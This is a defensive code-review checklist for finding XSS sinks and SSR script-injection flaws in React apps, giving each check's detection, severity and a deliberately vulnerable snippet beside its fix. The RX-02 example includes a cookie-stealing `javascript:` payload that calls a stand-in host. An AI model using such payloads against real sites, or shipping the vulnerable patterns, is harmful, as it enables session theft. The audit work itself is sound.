# Checks: XSS sinks and SSR injection (RX, RS)

Load when: running guide 01. Each check gives detection, confirmation, false positives, severity, a vulnerable and fixed pair, and refs. Ripgrep commands are in [detection-patterns.md](detection-patterns.md); `scripts/sink_scan.py` emits the same check ids as candidates.

Severity words follow the contract (section 7) and [finding-rules.md](finding-rules.md). "Untrusted" means any value that a user, another tenant, a URL, a third-party API, or a CMS editor without full trust can influence.

---

## RX-01 dangerouslySetInnerHTML with a non-constant value

- **Detect:** every `dangerouslySetInnerHTML=` whose `__html` is not a string literal. Also `eslint-disable` comments for `react/no-danger`.
- **Confirm:** trace `__html` back to its origin. Untrusted origin plus no sanitizer on the path (or a sanitizer that runs before further string edits) is a finding. Read the sanitizer call and its options (RX-08).
- **False positive:** value is a build-time constant, an imported static asset, or output of a sanitizer applied as the last step with default options; markup produced by a trusted library that escapes text (for example a syntax highlighter that HTML-escapes code).
- **Severity:** `high` when attacker-controlled content from other users reaches it (stored XSS: comments, profiles, CMS fields from untrusted editors); `medium` when only the same user or a trusted editor controls it; `critical` only if it renders on an admin or high-privilege page from untrusted input with a confirmed path. Pattern match with no traced source: `possible`, cap `medium`.
- **Vulnerable:**
  ```tsx
  export function Bio({ user }: { user: User }) {
    return <div dangerouslySetInnerHTML={{ __html: user.bioHtml }} />;
  }
  ```
- **Fixed:**
  ```tsx
  import DOMPurify from 'dompurify';
  export function Bio({ user }: { user: User }) {
    const clean = DOMPurify.sanitize(user.bioHtml); // last step, default options
    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
  }
  ```
  Better still, render text (`{user.bio}`) or markdown through react-markdown without raw HTML.
- **Refs:** CWE-79, OWASP A05:2025, raw/xss--react-docs-dangerouslysetinnerhtml.md, raw/owasp--cheatsheet-xss-dom-xss-redirects.md.

## RX-02 Dynamic URLs in href, src, action, formAction, xlinkHref, data, srcDoc

- **Detect:** JSX attributes `href`, `src`, `action`, `formAction`, `xlinkHref`, `data`, `srcDoc` set from an expression; literal `javascript:` or `data:text/html` strings.
- **Confirm:** find the React version (guide 00). Trace the value. On React 18 or older, an untrusted URL with no scheme allow-list is script execution on click (`javascript:`). On React 19, `javascript:` is neutralized in those attributes, but `data:` URLs, `srcDoc`, and non-listed attributes are not. Check `<iframe src>`, `<object data>` on non-object tags, `<embed>`, and `srcDoc` closely.
- **False positive:** value built from a relative path template (`` `/users/${id}` ``), a constant, or passed through a URL parser with an `http:`/`https:`/`mailto:` allow-list. On React 19 a `javascript:` value in `href` alone is defense-in-depth only.
- **Severity:** React 18 with untrusted `href` from other users: `high`. Same on React 19: `low` (React blocks it) unless the value also reaches a non-sanitized sink such as `window.location` (then see AR-03). `srcDoc` or `<iframe src>` from untrusted input: `high`. `data:` URL from untrusted input in iframe or object: `medium`, `possible` until reproduced.
- **Vulnerable (React 18):**
  ```tsx
  <a href={profile.website}>Website</a>   // profile.website = "javascript:fetch('//x/'+document.cookie)"
  ```
- **Fixed:**
  ```tsx
  function safeHref(raw: string): string | undefined {
    try {
      const u = new URL(raw, window.location.origin);
      return ['http:', 'https:', 'mailto:'].includes(u.protocol) ? u.href : undefined;
    } catch { return undefined; }
  }
  <a href={safeHref(profile.website)} rel="noopener noreferrer">Website</a>
  ```
- **Refs:** CWE-79, OWASP A05:2025, raw/xss--react-dom-url-sanitization-source.md, raw/owasp--cheatsheet-xss-dom-xss-redirects.md.

## RX-03 Raw HTML written to the DOM through refs or document

- **Detect:** `.innerHTML =`, `.innerHTML +=`, `.outerHTML =`, `insertAdjacentHTML(`, `document.write(`, usually inside `useEffect`, `useLayoutEffect`, or a ref callback.
- **Confirm:** same trace as RX-01. These bypass React entirely, so React 19 protections never apply.
- **False positive:** assigning `''` to clear a node; assigning a constant; writing `textContent` (safe).
- **Severity:** as RX-01.
- **Vulnerable:**
  ```tsx
  useEffect(() => { ref.current!.innerHTML = props.message; }, [props.message]);
  ```
- **Fixed:**
  ```tsx
  useEffect(() => { ref.current!.textContent = props.message; }, [props.message]);
  // or simply: <p>{props.message}</p>
  ```
- **Refs:** CWE-79, OWASP A05:2025, raw/owasp--cheatsheet-xss-dom-xss-redirects.md, raw/xss--mdn-trusted-types.md.

## RX-04 Strings evaluated as code

- **Detect:** `eval(`, `new Function(`, `setTimeout("...")` or `setInterval` with a string.
- **Confirm:** any untrusted part of the string. Also check build tooling only in the client bundle path (Node scripts are polyglot or generic territory).
- **False positive:** feature detection of fixed strings; code under `scripts/` or build config that never ships to users.
- **Severity:** untrusted input: `high` (client) or `critical` (server). Fixed strings: not a finding.
- **Vulnerable:** `const fn = new Function('row', `return ${userFormula}`);`
- **Fixed:** parse the formula with a dedicated expression parser that has no access to globals, or offer a fixed set of operations.
- **Refs:** CWE-94, CWE-95 (A05:2025 maps CWE-95), raw/owasp--cheatsheet-xss-dom-xss-redirects.md.

## RX-05 Markdown rendered as raw HTML

- **Detect:** `rehype-raw` in `rehypePlugins`; a custom `urlTransform`; `marked`, `markdown-it`, `showdown`, `remark-html` output passed to `dangerouslySetInnerHTML` or `innerHTML`.
- **Confirm:** react-markdown is safe by default. It becomes unsafe when `rehype-raw` is used without `rehype-sanitize` after it, when `urlTransform` returns URLs unchanged (for example `urlTransform={(u) => u}`), or when a custom component renders `props.href` into a sink. marked does not sanitize; its output must go through DOMPurify (RX-08).
- **False positive:** markdown comes only from files in the repo or a fully trusted author; `rehype-sanitize` is last in the plugin list; marked output is passed to `DOMPurify.sanitize` as the final step.
- **Severity:** user-supplied markdown with raw HTML enabled: `high`. Trusted CMS editors only: `low` (defense in depth), unless editors are external customers.
- **Vulnerable:**
  ```tsx
  <Markdown rehypePlugins={[rehypeRaw]}>{comment.body}</Markdown>
  <div dangerouslySetInnerHTML={{ __html: marked.parse(comment.body) }} />
  ```
- **Fixed:**
  ```tsx
  <Markdown>{comment.body}</Markdown>  // raw HTML escaped by default
  // if raw HTML is required:
  <Markdown rehypePlugins={[rehypeRaw, rehypeSanitize]}>{comment.body}</Markdown>
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(marked.parse(comment.body) as string) }} />
  ```
- **Refs:** CWE-79, OWASP A05:2025, raw/xss--react-markdown-readme-security.md, raw/xss--marked-readme-and-advisories.md.

## RX-06 Untrusted MDX compiled or evaluated

- **Detect:** `next-mdx-remote` (`serialize`, `compileMDX`, `MDXRemote`), `@mdx-js/mdx` (`compile`, `evaluate`, `run`), `mdx-bundler` (`bundleMDX`), and `blockJS: false` or `blockDangerousJS: false`.
- **Confirm:** where does the MDX source come from? Repo files only: not a finding. Database, user upload, CMS with external authors, URL: finding. Check the next-mdx-remote version (CVE-2026-0969, fixed in 6.0.0).
- **False positive:** MDX authored only by the repo's developers and committed to the repo.
- **Severity:** untrusted MDX compiled on a server: `critical` (code execution). Evaluated only in the browser: `high` (XSS). Vulnerable next-mdx-remote version with no untrusted source found: `low`, `possible`.
- **Vulnerable:**
  ```ts
  const mdx = await serialize(await db.posts.body(id), { blockJS: false });
  ```
- **Fixed:** keep `blockJS: true` (default in next-mdx-remote 6), upgrade to 6.0.0 or later, and accept only markdown (not MDX) from users, rendered with react-markdown.
- **Refs:** CWE-94, OWASP A05:2025, CVE-2026-0969, raw/xss--mdx-next-mdx-remote-cve-2026-0969.md.

## RX-07 HTML-to-React parsers on untrusted HTML

- **Detect:** imports of `html-react-parser`, `react-html-parser`, `htmr`.
- **Confirm:** trace the input. html-react-parser states it is not XSS safe; react-html-parser is unmaintained since 2017.
- **False positive:** input already passed through DOMPurify as the last step, or constant HTML.
- **Severity:** as RX-01.
- **Vulnerable:** `return <>{parse(ticket.htmlBody)}</>;`
- **Fixed:** `return <>{parse(DOMPurify.sanitize(ticket.htmlBody))}</>;`
- **Refs:** CWE-79, CWE-1104 (react-html-parser), raw/xss--html-react-parser-readme.md.

## RX-08 Sanitizer misuse

- **Detect:** DOMPurify options `ADD_TAGS`, `ADD_ATTR`, `ALLOW_UNKNOWN_PROTOCOLS`, `IN_PLACE`, `CUSTOM_ELEMENT_HANDLING`, `WHOLE_DOCUMENT`, `addHook`; server-side DOMPurify with `happy-dom` or an old `jsdom`; hand-rolled sanitizers (`.replace(/<script/gi, '')`); string edits after sanitizing; dompurify version below 3.4.7 (script).
- **Confirm:** read the full call. Ask: does anything modify the HTML after `sanitize`? Are allowed tags or attributes widened to `iframe`, `style`, `on*`, `srcdoc`, `form`, `formaction`? Is the server DOM `happy-dom` (DOMPurify says not safe)? Is a regex used instead of a sanitizer?
- **False positive:** `ADD_ATTR: ['target']` alone with `rel` enforced in a hook; current jsdom on the server.
- **Severity:** regex sanitizer or sanitize-then-modify on untrusted HTML: `high`. Risky widened options: `medium`. Outdated dompurify with the named options in use: per the script (usually `medium`).
- **Vulnerable:**
  ```ts
  let html = DOMPurify.sanitize(input);
  html = html.replace('{{name}}', user.name);   // reintroduces raw input after sanitizing
  ```
- **Fixed:** substitute first, sanitize last: `DOMPurify.sanitize(input.replace('{{name}}', escapeHtml(user.name)))`.
- **Refs:** CWE-79, CWE-1395 (outdated version), raw/xss--dompurify-readme-and-advisories.md.

## RX-09 Trusted Types policy that passes input through

- **Detect:** `trustedTypes.createPolicy(`, especially a `'default'` policy; CSP `require-trusted-types-for`.
- **Confirm:** a policy whose `createHTML` returns its input unchanged (`(s) => s`) defeats enforcement. On React below 19.3.0 with enforcement on, React stringifies values and the browser rejects them, which often pushes developers to a passthrough default policy.
- **False positive:** policy wraps `DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: false })`.
- **Severity:** passthrough `default` policy: `medium` (it disables a defense the team believes is on). Trusted Types simply absent: not a finding here (header posture belongs to the generic pass).
- **Vulnerable:** `trustedTypes.createPolicy('default', { createHTML: (s) => s });`
- **Fixed:** `trustedTypes.createPolicy('default', { createHTML: (s) => DOMPurify.sanitize(s, { RETURN_TRUSTED_TYPE: false }) });` and on React 19.3.0+ pass `TrustedHTML` objects directly.
- **Refs:** CWE-79, raw/xss--mdn-trusted-types.md, raw/rsc--react-release-notes-19-2-x-and-19-3.md.

## RX-10 CSS built from untrusted values

- **Detect:** `` style={{ backgroundImage: `url(${x})` }} ``, `<style>{userCss}</style>`, `dangerouslySetInnerHTML` inside `<style>`.
- **Confirm:** untrusted value in a CSS URL context or whole stylesheets from users. OWASP lists CSS URL contexts as sinks.
- **False positive:** value from a validated URL (see RX-02 helper) or a fixed asset.
- **Severity:** user-controlled stylesheet: `medium` (UI redress and data exfiltration by CSS); URL value only: `low`, `possible` until reproduced.
- **Vulnerable:** `<div style={{ backgroundImage: `url(${banner.url})` }} />`
- **Fixed:** `<div style={{ backgroundImage: `url(${JSON.stringify(safeHref(banner.url) ?? '')})` }} />`
- **Refs:** CWE-79, raw/owasp--cheatsheet-xss-dom-xss-redirects.md.

## RX-11 target="_blank" on user-supplied links without rel

- **Detect:** `target="_blank"` without `rel` containing `noopener` or `noreferrer`.
- **Confirm:** the `href` is external or user-supplied.
- **Severity:** `low` hygiene.
- **Vulnerable:** `<a href={post.link} target="_blank">`
- **Fixed:** `<a href={safeHref(post.link)} target="_blank" rel="noopener noreferrer">`
- **Refs:** CWE-1022 (A06:2025 maps it), raw/lint--eslint-plugin-react-security-rules.md.

---

## RS-01 State serialized into a script tag without escaping

- **Detect:** `window.__INITIAL_STATE__ =`, `__PRELOADED_STATE__`, `__APOLLO_STATE__`, `<script dangerouslySetInnerHTML={{ __html: JSON.stringify(...) }} />`, template strings that put `JSON.stringify(...)` inside `<script>`.
- **Confirm:** is any field user-controlled (names, comments, search terms)? Is `<` escaped (`.replace(/</g, '\\u003c')`) or is serialize-javascript 7.0.5 or later used? `JSON.stringify` alone does not escape `</script>`.
- **False positive:** state contains only numbers and enums; escaping applied after stringify.
- **Severity:** user-controlled strings in the state of a page other users load: `high`. Only the requesting user's own input: `medium` (reflected XSS via crafted link, for example a search query).
- **Vulnerable:**
  ```ts
  res.send(`<script>window.__INITIAL_STATE__ = ${JSON.stringify(state)}</script>`);
  ```
- **Fixed:**
  ```ts
  const json = JSON.stringify(state).replace(/</g, '\\u003c');
  res.send(`<script>window.__INITIAL_STATE__ = ${json}</script>`);
  ```
- **Refs:** CWE-79, OWASP A05:2025, raw/ssr--redux-server-rendering-security.md, raw/ssr--serialize-javascript-advisories.md.

## RS-02 bootstrapScriptContent or inline scripts built from request data

- **Detect:** `bootstrapScriptContent:` in `renderToPipeableStream` or `renderToReadableStream` calls.
- **Confirm:** React escapes `<script` and `</script` inside it, so tag breakout is blocked, but quotes are not: `` `window.locale = "${req.query.lang}"` `` still lets an attacker write JavaScript. Look for interpolation of request values.
- **False positive:** constant content, or values serialized with `JSON.stringify` and escaped as in RS-01.
- **Severity:** request data interpolated: `high` (reflected XSS on every page).
- **Vulnerable:** ``bootstrapScriptContent: `window.__LANG = "${req.query.lang}"` ``
- **Fixed:** ``bootstrapScriptContent: `window.__LANG = ${JSON.stringify(String(req.query.lang ?? 'en')).replace(/</g, '\\u003c')}` `` plus an allow-list of languages.
- **Refs:** CWE-79, CWE-94, raw/ssr--react-dom-server-stream-options-and-escaping.md.

## RS-03 HTML shell built with string templates

- **Detect:** `res.send(` or `res.end(` with a template literal containing HTML; `.replace('<!--app-html-->', ...)` placeholder swaps in Vite SSR templates; `renderToString` output concatenated with other values.
- **Confirm:** `renderToString` output is escaped by React, but anything else concatenated (title, meta tags, canonical URL from `req.url`, OG tags from user content) is not. Trace each interpolated value.
- **False positive:** only React output and constants are inserted.
- **Severity:** request URL or user content in the shell: `high`.
- **Vulnerable:**
  ```ts
  html = template.replace('<!--app-head-->', `<title>${post.title}</title>`)
  ```
- **Fixed:** render the head with React (`<title>{post.title}</title>`), or HTML-escape every inserted value with a tested escaper.
- **Refs:** CWE-79, OWASP A05:2025, raw/ssr--redux-server-rendering-security.md.
